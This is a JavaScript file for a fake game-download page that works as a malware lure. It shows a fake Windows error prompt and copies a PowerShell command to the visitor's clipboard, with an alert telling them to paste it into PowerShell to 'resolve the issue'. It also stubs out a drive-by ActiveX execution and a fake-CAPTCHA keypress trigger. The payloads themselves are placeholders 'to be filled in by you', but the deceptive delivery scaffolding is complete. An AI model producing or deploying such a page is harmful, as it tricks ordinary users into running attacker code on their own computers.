// Trigger for Game 1 Download (PowerShell Fake Error Prompt)
function triggerDownload1() {
    // Show the fake Windows error prompt
    document.getElementById('error-prompt').classList.remove('hidden');
    document.getElementById('error-prompt').scrollIntoView();
}

// Placeholder for payload (to be filled in by you)
function copyCommand() {
    const command = "powershell -Command <your-payload-here>";
    navigator.clipboard.writeText(command).then(() => {
        alert("Command copied to clipboard! Open PowerShell and paste it to resolve the issue.");
    });
}

// Trigger for Game 2 Download (Drive-by PowerShell Execution)
function triggerDownload2() {
    // Fake download initiation logic
    alert("Starting your download...");

    // Insert payload trigger (this space is reserved for your custom payload)
    // E.g., using ActiveX to run a PowerShell command (on vulnerable browsers)
    // payload placeholder here
}

// Trigger for Game 3 Download (CAPTCHA-based PowerShell Trigger)
function triggerDownload3() {
    // Show the CAPTCHA prompt
    document.getElementById('captcha-section').classList.remove('hidden');
    document.getElementById('captcha-section').scrollIntoView();
}

// Placeholder for CAPTCHA attack (to be filled in by you)
function triggerCaptcha() {
    // Simulate CAPTCHA success
    alert("CAPTCHA solved!");

    // Insert CAPTCHA-based PowerShell trigger here
    // E.g., bind a keypress to execute the payload silently
}
